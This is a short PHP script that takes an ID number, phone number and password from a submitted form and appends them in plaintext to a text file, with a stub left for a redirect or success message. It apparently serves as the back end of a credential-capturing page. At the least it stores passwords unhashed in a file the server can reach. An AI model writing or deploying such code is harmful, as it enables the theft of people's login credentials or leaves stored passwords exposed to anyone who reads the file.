<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $Id = $_POST["Id"];
  $Phone = $_POST["Phone"];
  $password = $_POST["password"];

  // Save the username and password to a file
  $data = "Id no.  : $Id \nPhone no.: $Phone no.\nPassword: $password\n";
  file_put_contents("Id.txt", $data, FILE_APPEND);

  // Redirect or display a success message
  // ...
  // Your code here
}
?>
